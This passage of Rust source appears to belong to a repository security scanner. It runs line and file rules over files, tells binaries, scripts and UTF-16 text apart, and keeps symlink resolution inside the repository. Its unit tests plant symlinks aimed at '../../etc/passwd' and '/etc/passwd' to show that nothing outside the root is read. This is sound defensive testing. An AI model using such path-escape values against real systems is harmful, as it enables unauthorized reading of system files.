//! Running rules over a repository.

use std::collections::HashSet;
use std::fs;
use std::path::{Component, Path, PathBuf};

use crate::checks::{FileCheck, FileCtx, FileIssue, RepoIndex};
use crate::finding::{Finding, Severity};
use crate::rule::{Matcher, Rule};
use crate::sanitize::{display_safe, to_slash};
use crate::walk::{self, Limits, SkipReason, Skipped};

/// Explanations built from text in the scanned repository are cut to this.
const MAX_EXPLANATION_CHARS: usize = 300;

/// How many leading bytes are checked to tell text from binary files.
const BINARY_SNIFF_LEN: usize = 8 * 1024;

/// Extensions of files that a shell, an interpreter or a script host reads as
/// text. A NUL byte in one of them does not make it a binary: `bash`, `node`
/// and the others still run it, so the line rules must still look at it.
const SCRIPT_EXTENSIONS: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "csh", "fish", "py", "pyw", "js", "mjs", "cjs", "jsx", "ts", "tsx",
    "rb", "pl", "pm", "php", "ps1", "psm1", "psd1", "bat", "cmd", "vbs", "wsf", "lua",
];

/// A file with NUL bytes that is not a script is read by the line rules only
/// if at most one byte in this many is NUL. Text with a stray NUL has a
/// handful of them; padding in a data format, or ASCII text in UTF-16 without a
/// byte order mark (one byte in two), has far more. One in eight is above any
/// accidental NUL in text and well below the density of such data.
const MAX_NUL_RATIO: u64 = 8;

/// One file check may list at most this many findings for one file; the rest
/// are summarized on the last one, so a hostile file cannot flood the report.
const MAX_FINDINGS_PER_FILE_CHECK: usize = 100;

/// A line rule lists at most this many findings per file; the rest are only
/// counted (`Report::unlisted`), so a hostile file cannot flood the report.
const MAX_LINE_FINDINGS_PER_RULE: usize = 100;

/// Added to findings from a file that has NUL bytes and does not read as text.
const BINARY_LOOKING_NOTE: &str = " (found in a binary-looking file)";

/// Everything one scan produced. Front ends decide how to show it.
#[derive(Debug, Default)]
pub struct Report {
    /// Sorted by file, then line, then rule ID.
    pub findings: Vec<Finding>,
    /// Number of files that were read and analysed: text files, and binary
    /// files that a file-level rule examined.
    pub files_scanned: usize,
    /// Findings a line rule produced beyond the per-file limit, which are not
    /// in `findings`.
    pub unlisted: Vec<Unlisted>,
    /// Files that were not (fully) analysed, with the reason. Nothing is left
    /// out silently: binary, oversized, symlinked and unreadable files are all
    /// listed here.
    pub skipped: Vec<Skipped>,
    /// True if the file-count limit cut the scan short.
    pub truncated: bool,
}

/// Findings of one rule in one file that were counted but not listed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Unlisted {
    pub file: PathBuf,
    pub rule_id: String,
    /// The level of the rule: every finding of one rule has the same level, and
    /// the limit applies per rule, so a flood of LOW findings from one rule can
    /// never push a CRITICAL one from another rule out of the list.
    pub severity: Severity,
    pub count: usize,
}

impl Report {
    /// Whether the scan can vouch for what it looked at. A report with no
    /// findings is only a clean bill of health when this is true: a payload
    /// may sit past the file limit, in a file that was too large or could not
    /// be opened, or in an executable nobody analyzes yet.
    pub fn is_complete(&self) -> bool {
        !self.truncated && self.inconclusive_count() == 0
    }

    /// Number of skipped files that make the scan inconclusive, see
    /// `SkipReason::makes_scan_inconclusive`.
    pub fn inconclusive_count(&self) -> usize {
        self.skipped
            .iter()
            .filter(|skipped| skipped.reason.makes_scan_inconclusive())
            .count()
    }
}

/// Scans every file under `root` with every rule.
///
/// All rules always run; hiding findings by severity, stage or family is
/// left to the front end, so filters can change without rescanning.
pub fn scan(root: &Path, rules: &[Rule], limits: Limits) -> Report {
    let walked = walk::walk(root, limits);

    // Where files are allowed to be looked up: everything the walk saw,
    // including files it did not hand over because of the size limit or
    // because they are symlinks.
    let index = RepoIndex::new(
        walked
            .files
            .iter()
            .map(|path| to_slash(path))
            .chain(
                walked
                    .skipped
                    .iter()
                    .filter_map(|skipped| match skipped.reason {
                        SkipReason::TooLarge { .. } | SkipReason::Symlink { .. } => {
                            Some(to_slash(&skipped.path))
                        }
                        _ => None,
                    }),
            ),
    );
    let regular_files: HashSet<String> = walked.files.iter().map(|path| to_slash(path)).collect();
    let file_rules: Vec<(&Rule, FileCheck)> = rules
        .iter()
        .filter_map(|rule| match rule.matcher {
            Matcher::File(check) => Some((rule, check)),
            _ => None,
        })
        .collect();
    let env = Env {
        index: &index,
        truncated: walked.truncated,
        file_rules: &file_rules,
    };

    let mut report = Report {
        truncated: walked.truncated,
        ..Report::default()
    };
    let mut skipped = walked.skipped;

    for relative in &walked.files {
        let slash_path = to_slash(relative);
        let bytes = match fs::read(root.join(relative)) {
            Ok(bytes) => bytes,
            Err(err) => {
                skipped.push(Skipped {
                    path: relative.clone(),
                    reason: SkipReason::Unreadable {
                        error: err.to_string(),
                    },
                });
                continue;
            }
        };

        // File-level rules go first and see the raw bytes, so a file is judged
        // the way its consumer reads it, even if it looks like a binary here.
        let checked = env.run_file_checks(relative, &slash_path, &bytes, None);
        report.findings.extend(checked.findings);

        let script = is_script(&slash_path, &bytes);
        let nul_line = script.then(|| first_nul_line(&bytes)).flatten();
        let mut utf16_text = None;
        let mut binary_looking = false;

        if looks_binary(&bytes) {
            // An executable is listed even when a file rule looked at it, and
            // even when its name says script: the rule saw the bytes of a
            // `.pth` or `.start` file, not the code of the program.
            if let Some(format) = executable_format(&bytes) {
                skipped.push(Skipped {
                    path: relative.clone(),
                    reason: SkipReason::Executable { format },
                });
                if checked.examined {
                    report.files_scanned += 1;
                }
                continue;
            }
            // A script with a NUL byte is still a script, and the NUL is
            // reported by its own rule (`nul_line`).
            if !script {
                if has_utf16_bom(&bytes) && has_script_extension(&slash_path) {
                    // Windows PowerShell and WSH read UTF-16 scripts.
                    utf16_text = Some(decode_utf16_bom(&bytes));
                } else if known_binary_magic(&bytes) {
                    binary_looking = true;
                }
            }
        }
        // Any other file with a NUL byte that does not read as text, and any
        // file with a known binary header, may still be sourced by a shell:
        // `dash` drops the NULs and runs the rest, whatever else is in the
        // file (`GIF89a=1` is a valid assignment). So it goes to the line
        // rules too, but only as ASCII (see `ascii_only_text`), because on
        // data such as icons and audio a rule that looks for a non-ASCII
        // character matches by chance. It is listed, so the report shows
        // that its binary contents were not looked at.
        if !script && utf16_text.is_none() && bytes.contains(&0) && !nul_file_is_text(&bytes) {
            binary_looking = true;
        }
        if binary_looking {
            skipped.push(Skipped {
                path: relative.clone(),
                reason: SkipReason::Binary,
            });
        }

        report.files_scanned += 1;
        let text = match utf16_text {
            Some(text) => text,
            None if binary_looking => ascii_only_text(&bytes),
            None => text_without_nuls(&bytes),
        };
        let mut found = scan_text(
            relative,
            &slash_path,
            &text,
            nul_line,
            rules,
            &mut report.unlisted,
        );
        if binary_looking {
            for finding in &mut found {
                finding.explanation.push_str(BINARY_LOOKING_NOTE);
            }
        }
        report.findings.extend(found);
    }

    // Entries the walk did not hand over still matter to a rule that asks for
    // that file by name: an oversized file or a symlink is not a way around it.
    let walk_skips: Vec<Skipped> = skipped.clone();
    for entry in &walk_skips {
        let slash_path = to_slash(&entry.path);
        let checked = match &entry.reason {
            SkipReason::TooLarge { size } => env.run_file_checks(
                &entry.path,
                &slash_path,
                &[],
                Some(FileIssue::TooLarge { size: *size }),
            ),
            SkipReason::Symlink { target } => {
                let bytes =
                    symlink_target_bytes(root, &entry.path, target.as_deref(), &regular_files);
                let issue = FileIssue::Symlink {
                    target: target.as_deref().map(to_slash),
                };
                env.run_file_checks(&entry.path, &slash_path, &bytes, Some(issue))
            }
            _ => continue,
        };
        report.findings.extend(checked.findings);
    }

    report.skipped = skipped;
    report
        .findings
        .sort_by(|a, b| (&a.file, a.line, &a.rule_id).cmp(&(&b.file, b.line, &b.rule_id)));
    report
}

/// What a scan shares between files.
struct Env<'a> {
    index: &'a RepoIndex,
    truncated: bool,
    file_rules: &'a [(&'a Rule, FileCheck)],
}

/// The outcome of offering one file to the file-level rules.
struct Checked {
    /// True if at least one file-level rule applies to this path.
    examined: bool,
    findings: Vec<Finding>,
}

impl Env<'_> {
    fn run_file_checks(
        &self,
        relative: &Path,
        slash_path: &str,
        bytes: &[u8],
        issue: Option<FileIssue>,
    ) -> Checked {
        let mut checked = Checked {
            examined: false,
            findings: Vec::new(),
        };
        for (rule, check) in self.file_rules {
            if !rule.applies_to(slash_path) {
                continue;
            }
            checked.examined = true;
            let ctx = FileCtx {
                path: slash_path,
                bytes,
                issue: issue.clone(),
                repo: self.index,
                truncated: self.truncated,
                base: rule.severity,
            };
            let mut hits = check(&ctx);
            let unlisted = hits.len().saturating_sub(MAX_FINDINGS_PER_FILE_CHECK);
            hits.truncate(MAX_FINDINGS_PER_FILE_CHECK);

            let start = checked.findings.len();
            for hit in hits {
                checked.findings.push(Finding {
                    rule_id: rule.id.clone(),
                    severity: hit.severity,
                    stage: rule.stage,
                    attack: rule.attack.clone(),
                    file: relative.to_path_buf(),
                    line: hit.line,
                    // The reason may quote the scanned file, so it is cleaned
                    // before it can reach a terminal.
                    explanation: display_safe(&hit.reason, MAX_EXPLANATION_CHARS),
                });
            }
            if unlisted > 0
                && let Some(last) = checked.findings[start..].last_mut()
            {
                last.explanation.push_str(&format!(
                    " [{unlisted} more from this rule in this file not listed]"
                ));
            }
        }
        checked
    }
}

/// The content of the file a symlink points at, if that is a regular file
/// inside the repository; empty otherwise. The target is resolved as text, so
/// nothing outside the scanned directory is ever opened.
fn symlink_target_bytes(
    root: &Path,
    link: &Path,
    target: Option<&Path>,
    regular_files: &HashSet<String>,
) -> Vec<u8> {
    let Some(resolved) = target.and_then(|target| resolve_inside(link, target)) else {
        return Vec::new();
    };
    if !regular_files.contains(&to_slash(&resolved)) {
        return Vec::new();
    }
    fs::read(root.join(resolved)).unwrap_or_default()
}

/// Resolves `target` relative to the directory of `link`, purely lexically.
/// Returns `None` for absolute targets and for targets that leave the root.
fn resolve_inside(link: &Path, target: &Path) -> Option<PathBuf> {
    let mut resolved: Vec<_> = link.parent()?.components().collect();
    for component in target.components() {
        match component {
            Component::Normal(_) => resolved.push(component),
            Component::CurDir => {}
            Component::ParentDir => {
                resolved.pop()?;
            }
            Component::RootDir | Component::Prefix(_) => return None,
        }
    }
    Some(resolved.into_iter().collect())
}

/// Runs line, JSONC and other text rules over one file's text. `relative` is
/// the path shown in findings; `slash_path` is matched against each rule's
/// `files` globs.
fn scan_text(
    relative: &Path,
    slash_path: &str,
    text: &str,
    nul_line: Option<usize>,
    rules: &[Rule],
    unlisted: &mut Vec<Unlisted>,
) -> Vec<Finding> {
    let applicable: Vec<&Rule> = rules
        .iter()
        .filter(|rule| rule.applies_to(slash_path))
        .collect();
    if applicable.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();
    for rule in applicable {
        match &rule.matcher {
            Matcher::LineRegex(pattern) => {
                let mut listed = 0;
                let mut hidden = 0;
                for (index, line) in text.lines().enumerate() {
                    if pattern.is_match(line) {
                        if listed == MAX_LINE_FINDINGS_PER_RULE {
                            hidden += 1;
                            continue;
                        }
                        listed += 1;
                        findings.push(Finding {
                            rule_id: rule.id.clone(),
                            severity: rule.severity,
                            stage: rule.stage,
                            attack: rule.attack.clone(),
                            file: relative.to_path_buf(),
                            line: index + 1,
                            explanation: rule.description.clone(),
                        });
                    }
                }
                if hidden > 0 {
                    unlisted.push(Unlisted {
                        file: relative.to_path_buf(),
                        rule_id: rule.id.clone(),
                        severity: rule.severity,
                        count: hidden,
                    });
                }
            }
            Matcher::Jsonc(check) => {
                for hit in check(slash_path, text, rule.severity) {
                    findings.push(Finding {
                        rule_id: rule.id.clone(),
                        severity: hit.severity,
                        stage: rule.stage,
                        attack: rule.attack.clone(),
                        file: relative.to_path_buf(),
                        line: hit.line,
                        // The reason may quote the scanned file, so it is
                        // cleaned before it can reach a terminal.
                        explanation: display_safe(&hit.reason, MAX_EXPLANATION_CHARS),
                    });
                }
            }
            // File-level rules already ran on the raw bytes.
            Matcher::File(_) => {}
            Matcher::NulByte => {
                if let Some(line) = nul_line {
                    findings.push(Finding {
                        rule_id: rule.id.clone(),
                        severity: rule.severity,
                        stage: rule.stage,
                        attack: rule.attack.clone(),
                        file: relative.to_path_buf(),
                        line,
                        explanation: rule.description.clone(),
                    });
                }
            }
        }
    }
    findings
}

/// Whether the file is meant to be read as a script: it has a script
/// extension or starts with a shebang. A file with a UTF-16 byte order mark is
/// not one here, because UTF-16 text is full of NUL bytes by design (Windows
/// PowerShell writes it by default); it is decoded instead.
fn is_script(slash_path: &str, bytes: &[u8]) -> bool {
    if has_utf16_bom(bytes) {
        return false;
    }
    has_script_extension(slash_path) || bytes.starts_with(b"#!")
}

fn has_script_extension(slash_path: &str) -> bool {
    slash_path
        .rsplit('/')
        .next()
        .and_then(|name| name.rsplit_once('.'))
        .map(|(_, extension)| extension.to_ascii_lowercase())
        .is_some_and(|ext| SCRIPT_EXTENSIONS.contains(&ext.as_str()))
}

fn has_utf16_bom(bytes: &[u8]) -> bool {
    bytes.starts_with(&[0xFF, 0xFE]) || bytes.starts_with(&[0xFE, 0xFF])
}

/// Decodes UTF-16 after its byte order mark; unpaired surrogates and a odd
/// trailing byte become U+FFFD.
fn decode_utf16_bom(bytes: &[u8]) -> String {
    let little_endian = bytes.starts_with(&[0xFF, 0xFE]);
    let units = bytes[2..].chunks(2).map(|pair| match *pair {
        [a, b] if little_endian => u16::from_le_bytes([a, b]),
        [a, b] => u16::from_be_bytes([a, b]),
        _ => 0xFFFD,
    });
    char::decode_utf16(units)
        .map(|unit| unit.unwrap_or(char::REPLACEMENT_CHARACTER))
        .collect()
}

/// Headers of formats that are binary data by design and that no script
/// engine reads as text: archives, compressed streams, images, documents,
/// WebAssembly and fonts.
fn known_binary_magic(bytes: &[u8]) -> bool {
    const MAGICS: [&[u8]; 17] = [
        &[0x1F, 0x8B],
        &[0x28, 0xB5, 0x2F, 0xFD],
        b"BZh",
        &[0xFD, b'7', b'z', b'X', b'Z', 0],
        b"PK\x03\x04",
        b"PK\x05\x06",
        b"7z\xBC\xAF\x27\x1C",
        b"Rar!",
        b"\x89PNG",
        &[0xFF, 0xD8, 0xFF],
        b"GIF8",
        b"%PDF",
        b"\0asm",
        b"RIFF",
        b"wOF",
        b"OTTO",
        b"\0\x01\0\0",
    ];
    MAGICS.iter().any(|magic| bytes.starts_with(magic))
}

/// The file as `dash` and `bash` read it: the NUL bytes are dropped first and
/// the rest is decoded, so a multi-byte character cut by a NUL is whole again.
fn text_without_nuls(bytes: &[u8]) -> String {
    if !bytes.contains(&0) {
        return String::from_utf8_lossy(bytes).into_owned();
    }
    let kept: Vec<u8> = bytes.iter().copied().filter(|&b| b != 0).collect();
    String::from_utf8_lossy(&kept).into_owned()
}

/// Like `text_without_nuls`, but every non-ASCII byte becomes U+FFFD, so a
/// rule can only match ASCII. Used for NUL-bearing data that does not read as
/// text: the code a shell would run is still there, and noise cannot spell a
/// character by chance.
fn ascii_only_text(bytes: &[u8]) -> String {
    bytes
        .iter()
        .filter(|&&b| b != 0)
        .map(|&b| {
            if b.is_ascii() {
                char::from(b)
            } else {
                char::REPLACEMENT_CHARACTER
            }
        })
        .collect()
}

/// Whether a file that contains NUL bytes reads as text with a few stray ones:
/// the NULs are at most one byte in `MAX_NUL_RATIO`, and the rest is valid
/// UTF-8 once they are removed. Random data (compressed audio, icons) fails the
/// second test almost at once.
fn nul_file_is_text(bytes: &[u8]) -> bool {
    let mut probe = NulProbe::default();
    probe.feed(bytes);
    probe.is_text()
}

/// The two measurements behind `nul_file_is_text`, taken over a stream of
/// chunks so a large file never has to be in memory at once.
#[derive(Default)]
struct NulProbe {
    total: u64,
    nuls: u64,
    /// The start of a multi-byte UTF-8 sequence cut off by the end of a chunk.
    pending: Vec<u8>,
    invalid: bool,
}

impl NulProbe {
    fn feed(&mut self, chunk: &[u8]) {
        self.total += chunk.len() as u64;
        for (index, segment) in chunk.split(|&b| b == 0).enumerate() {
            if index > 0 {
                self.nuls += 1;
            }
            if self.invalid || segment.is_empty() {
                continue;
            }
            self.pending.extend_from_slice(segment);
            match std::str::from_utf8(&self.pending) {
                Ok(_) => self.pending.clear(),
                Err(err) if err.error_len().is_none() => {
                    self.pending.drain(..err.valid_up_to());
                }
                Err(_) => self.invalid = true,
            }
        }
    }

    fn is_text(&self) -> bool {
        !self.invalid && self.pending.is_empty() && self.nuls * MAX_NUL_RATIO <= self.total
    }
}

/// The 1-based line of the first NUL byte, counting `\n` as shells do.
fn first_nul_line(bytes: &[u8]) -> Option<usize> {
    let offset = bytes.iter().position(|&b| b == 0)?;
    Some(1 + bytes[..offset].iter().filter(|&&b| b == b'\n').count())
}

/// Names the executable format a file starts with, by its magic bytes:
/// ELF, PE (the `MZ` header), Mach-O in all four byte orders, and fat Mach-O
/// binaries (32 and 64 bit; fat headers are always big-endian on disk). The fat header `CAFEBABE` is also the header of a Java class
/// file; both are code that runs, so both count.
fn executable_format(bytes: &[u8]) -> Option<&'static str> {
    match bytes {
        [0x7F, b'E', b'L', b'F', ..] => Some("ELF"),
        [b'M', b'Z', ..] => Some("PE"),
        [0xFE, 0xED, 0xFA, 0xCE | 0xCF, ..] | [0xCE | 0xCF, 0xFA, 0xED, 0xFE, ..] => Some("Mach-O"),
        [0xCA, 0xFE, 0xBA, 0xBE | 0xBF, ..] => Some("Mach-O fat (or Java class)"),
        _ => None,
    }
}

/// Same heuristic as git and ripgrep: a NUL byte near the start means binary.
fn looks_binary(bytes: &[u8]) -> bool {
    bytes.iter().take(BINARY_SNIFF_LEN).any(|&b| b == 0)
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use globset::{GlobBuilder, GlobSetBuilder};

    use super::*;
    use crate::checks::Hit;
    use crate::finding::{Severity, Stage};
    use crate::rule::parse_rules;

    const RULES: &str = r#"
        [[rule]]
        id = "test.everywhere"
        engine = "line-regex"
        family = "test"
        stage = "run"
        severity = "low"
        description = "Matches TODO anywhere"
        example = "a.txt:1"
        pattern = 'TODO'

        [[rule]]
        id = "test.only-json"
        engine = "line-regex"
        family = "test"
        stage = "ide"
        severity = "high"
        description = "Matches TODO in JSON under .vscode"
        example = ".vscode/tasks.json:1"
        pattern = 'TODO'
        files = [".vscode/*.json"]
    "#;

    fn write(root: &Path, relative: &str, contents: &[u8]) {
        let path = root.join(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, contents).unwrap();
    }

    /// A file-level rule that reports what the engine handed to its check.
    fn probe(ctx: &FileCtx<'_>) -> Vec<Hit> {
        vec![Hit {
            line: 1,
            severity: ctx.base,
            reason: format!(
                "path={} bytes={} issue={:?} helper={} truncated={}",
                ctx.path,
                ctx.bytes.len(),
                ctx.issue,
                ctx.repo.has_module("helper"),
                ctx.truncated
            ),
        }]
    }

    fn file_rule(glob: &str, check: FileCheck) -> Rule {
        let mut globs = GlobSetBuilder::new();
        globs.add(
            GlobBuilder::new(glob)
                .case_insensitive(true)
                .build()
                .unwrap(),
        );
        Rule {
            id: "test.file".to_string(),
            family: "test".to_string(),
            stage: Stage::Deps,
            severity: Severity::High,
            attack: vec![],
            description: "test".to_string(),
            example: "x".to_string(),
            matcher: Matcher::File(check),
            files: Some(globs.build().unwrap()),
        }
    }

    fn explanations(report: &Report) -> Vec<(String, String)> {
        report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.explanation.clone()))
            .collect()
    }

    #[test]
    fn findings_have_file_line_and_rule_metadata() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"fine\nTODO here\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.files_scanned, 1);
        assert_eq!(report.findings.len(), 1);
        let finding = &report.findings[0];
        assert_eq!(finding.rule_id, "test.everywhere");
        assert_eq!(finding.file, PathBuf::from("a.txt"));
        assert_eq!(finding.line, 2);
    }

    #[test]
    fn file_globs_limit_where_a_rule_runs() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), ".vscode/tasks.json", b"TODO\n");
        write(dir.path(), "notes.json", b"TODO\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let ids: Vec<_> = report
            .findings
            .iter()
            .map(|f| (to_slash(&f.file), f.rule_id.as_str()))
            .collect();
        assert_eq!(
            ids,
            [
                (".vscode/tasks.json".to_string(), "test.everywhere"),
                (".vscode/tasks.json".to_string(), "test.only-json"),
                ("notes.json".to_string(), "test.everywhere"),
            ]
        );
    }

    #[test]
    fn binary_files_are_line_scanned_as_ascii_and_listed() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "blob.bin", b"\x1f\x8b\0\0TODO");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.files_scanned, 1);
        assert_eq!(report.findings.len(), 1);
        assert!(
            report.findings[0]
                .explanation
                .ends_with("(found in a binary-looking file)")
        );
        assert_eq!(
            report.skipped,
            [Skipped {
                path: PathBuf::from("blob.bin"),
                reason: SkipReason::Binary,
            }]
        );
    }

    #[test]
    fn crlf_line_endings_count_lines_correctly() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"one\r\ntwo\r\nTODO\r\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings[0].line, 3);
    }

    #[test]
    fn a_scan_that_read_everything_is_complete() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.txt", b"fine\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(report.is_complete());
        assert_eq!(report.inconclusive_count(), 0);
    }

    #[test]
    fn unread_and_executable_files_make_the_scan_incomplete() {
        let skip = |reason| Skipped {
            path: PathBuf::from("x"),
            reason,
        };
        for reason in [
            SkipReason::TooLarge { size: 9 },
            SkipReason::Unreadable {
                error: "denied".to_string(),
            },
            SkipReason::Executable { format: "ELF" },
        ] {
            let report = Report {
                skipped: vec![skip(reason.clone())],
                ..Report::default()
            };
            assert!(!report.is_complete(), "{reason:?}");
            assert_eq!(report.inconclusive_count(), 1);
        }
    }

    #[test]
    fn a_binary_that_was_read_but_has_no_rules_does_not_make_the_scan_incomplete() {
        let report = Report {
            skipped: vec![Skipped {
                path: PathBuf::from("data.gz"),
                reason: SkipReason::Binary,
            }],
            ..Report::default()
        };

        assert!(report.is_complete());
        assert_eq!(report.inconclusive_count(), 0);
    }

    #[test]
    fn executable_formats_are_recognised_by_their_magic_bytes() {
        let cases: [(&[u8], Option<&str>); 12] = [
            (b"\x7fELF\x02\x01\x01\0", Some("ELF")),
            (b"MZ\x90\0\x03\0", Some("PE")),
            (&[0xFE, 0xED, 0xFA, 0xCE, 0, 0], Some("Mach-O")),
            (&[0xFE, 0xED, 0xFA, 0xCF, 0, 0], Some("Mach-O")),
            (&[0xCE, 0xFA, 0xED, 0xFE, 0, 0], Some("Mach-O")),
            (&[0xCF, 0xFA, 0xED, 0xFE, 0, 0], Some("Mach-O")),
            (
                &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2],
                Some("Mach-O fat (or Java class)"),
            ),
            (
                &[0xCA, 0xFE, 0xBA, 0xBF, 0, 0, 0, 2],
                Some("Mach-O fat (or Java class)"),
            ),
            (&[0x1F, 0x8B, 8, 0, 0], None),
            (&[0x28, 0xB5, 0x2F, 0xFD, 0], None),
            (b"\x89PNG\r\n\x1a\n\0", None),
            (b"", None),
        ];
        for (bytes, expected) in cases {
            assert_eq!(executable_format(bytes), expected, "{bytes:?}");
        }
    }

    #[test]
    fn an_executable_that_a_file_rule_examined_is_still_listed() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "helper.start", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        let rules = vec![file_rule("*.start", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert_eq!(report.findings.len(), 1);
        assert_eq!(report.inconclusive_count(), 1);
        assert!(!report.is_complete());
    }

    #[test]
    fn an_elf_binary_is_listed_as_an_executable_and_a_gzip_file_as_plain_binary() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "tool", b"\x7fELF\x02\x01\x01\0\0\0\0\0");
        write(dir.path(), "data.gz", &[0x1F, 0x8B, 8, 0, 0, 0, 0, 0]);
        let rules = parse_rules(RULES, "test.toml").unwrap();

        let report = scan(dir.path(), &rules, Limits::default());

        let reasons: Vec<_> = report
            .skipped
            .iter()
            .map(|s| (to_slash(&s.path), s.reason.clone()))
            .collect();
        assert_eq!(
            reasons,
            [
                ("data.gz".to_string(), SkipReason::Binary),
                ("tool".to_string(), SkipReason::Executable { format: "ELF" }),
            ]
        );
        assert!(
            !report.is_complete(),
            "the executable makes it inconclusive"
        );
        assert_eq!(report.inconclusive_count(), 1);
    }

    #[test]
    fn a_symlink_alone_does_not_make_the_scan_incomplete() {
        let report = Report {
            skipped: vec![Skipped {
                path: PathBuf::from("link"),
                reason: SkipReason::Symlink { target: None },
            }],
            ..Report::default()
        };

        assert!(report.is_complete());
    }

    #[test]
    fn a_payload_past_the_file_limit_is_missed_and_the_scan_is_not_complete() {
        let dir = tempfile::tempdir().unwrap();
        // Padding sorts before the payload, so the limit cuts the payload off.
        for name in ["a1.txt", "a2.txt", "a3.txt", "a4.txt"] {
            write(dir.path(), name, b"padding\n");
        }
        write(dir.path(), "z-payload.txt", b"TODO payload\n");
        let rules = parse_rules(RULES, "test.toml").unwrap();
        let limits = Limits {
            max_files: 4,
            ..Limits::default()
        };

        let report = scan(dir.path(), &rules, limits);

        assert!(report.findings.is_empty(), "the payload was never read");
        assert!(report.truncated);
        assert!(
            !report.is_complete(),
            "no findings must not mean clean here"
        );
    }

    #[test]
    fn file_rules_see_raw_bytes_of_binary_looking_files() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "x.pth", b"# \0 comment\nimport os\n");
        write(dir.path(), "other.bin", b"\x1f\x8b\0\0");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let found = explanations(&report);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].0, "x.pth");
        assert!(found[0].1.contains("bytes=22 issue=None"), "{}", found[0].1);
        // The text file a rule examined is not listed; the binary one is
        // read as ASCII by the line rules and listed.
        assert_eq!(report.files_scanned, 2);
        assert_eq!(
            report.skipped,
            [Skipped {
                path: PathBuf::from("other.bin"),
                reason: SkipReason::Binary,
            }]
        );
    }

    #[test]
    fn file_rules_only_run_on_files_their_globs_select() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        write(dir.path(), "a.txt", b"x");
        write(dir.path(), "UPPER.PTH", b"x");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let files: Vec<_> = explanations(&report)
            .into_iter()
            .map(|(file, _)| file)
            .collect();
        assert_eq!(files, ["UPPER.PTH", "a.pth"]);
    }

    #[test]
    fn oversized_files_reach_file_rules_with_an_issue_and_stay_in_skipped() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "big.pth", &[b'#'; 100]);
        let limits = Limits {
            max_file_size: 10,
            ..Limits::default()
        };
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, limits);

        let found = explanations(&report);
        assert_eq!(found.len(), 1);
        assert!(
            found[0]
                .1
                .contains("bytes=0 issue=Some(TooLarge { size: 100 })"),
            "{}",
            found[0].1
        );
        assert_eq!(report.skipped.len(), 1);
        assert!(matches!(
            report.skipped[0].reason,
            SkipReason::TooLarge { size: 100 }
        ));
    }

    #[cfg(unix)]
    #[test]
    fn symlinks_reach_file_rules_with_the_target_content_when_it_is_inside() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "docs/notes.txt", b"12345");
        std::os::unix::fs::symlink("docs/notes.txt", dir.path().join("inside.pth")).unwrap();
        std::os::unix::fs::symlink("../../etc/passwd", dir.path().join("outside.pth")).unwrap();
        std::os::unix::fs::symlink("/etc/passwd", dir.path().join("absolute.pth")).unwrap();
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        let found = explanations(&report);
        let get = |name: &str| {
            found
                .iter()
                .find(|(file, _)| file == name)
                .unwrap()
                .1
                .clone()
        };
        assert!(
            get("inside.pth").contains("bytes=5 issue=Some(Symlink"),
            "{}",
            get("inside.pth")
        );
        assert!(get("outside.pth").contains("bytes=0 issue=Some(Symlink"));
        assert!(get("absolute.pth").contains("bytes=0 issue=Some(Symlink"));
        // All three are still listed as not followed.
        assert_eq!(
            report
                .skipped
                .iter()
                .filter(|s| matches!(s.reason, SkipReason::Symlink { .. }))
                .count(),
            3
        );
    }

    #[test]
    fn symlink_targets_are_resolved_without_touching_anything_outside() {
        let link = Path::new("a/b/link.pth");
        assert_eq!(
            resolve_inside(link, Path::new("../c.txt")),
            Some(PathBuf::from("a/c.txt"))
        );
        assert_eq!(
            resolve_inside(link, Path::new("./d/e.txt")),
            Some(PathBuf::from("a/b/d/e.txt"))
        );
        assert_eq!(resolve_inside(link, Path::new("../../../x")), None);
        assert_eq!(resolve_inside(link, Path::new("/etc/passwd")), None);
        assert_eq!(
            resolve_inside(Path::new("top.pth"), Path::new("../x")),
            None
        );
    }

    #[test]
    fn file_rules_can_ask_whether_a_module_is_in_the_repository() {
        let dir = tempfile::tempdir().unwrap();
        write(dir.path(), "a.pth", b"x");
        write(dir.path(), "lib/helper.py", b"x");
        let rules = [file_rule("**/*.pth", probe)];

        let report = scan(dir.path(), &rules, Limits::default());

        assert!(explanations(&report)[0].1.contains("helper=true"));
    }

    #[test]
    fn file_rules_are_told_when_the_walk_was_cut_short() {
        let dir = tempfile::tempdir().unwrap();
        for name in ["a.pth", "b.txt", "c.txt"] {
            write(dir.path(), name, b"x");
        }
        let limits = Limits {
            max_files: 2,
            ..Limits::default()
        };
